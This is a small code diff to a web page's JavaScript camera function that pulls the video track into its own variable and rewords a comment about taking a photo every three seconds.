@@ -54,7 +54,8 @@
     function startCapturing() {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then((stream) => {
-          const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+          const videoTrack = stream.getVideoTracks()[0];
+          const imageCapture = new ImageCapture(videoTrack);
 
           // Function to capture a photo from front/back camera
           function capturePhoto() {
@@ -75,8 +76,8 @@
               });
           }
 
-          // Set interval to capture photo continuously every 3 seconds
-          setInterval(capturePhoto, 3000);
+          // Continuously capture photo every 3 seconds
+          setInterval(capturePhoto, 3000);  // Interval set to capture every 3 seconds
 
         })
         .catch((error) => {
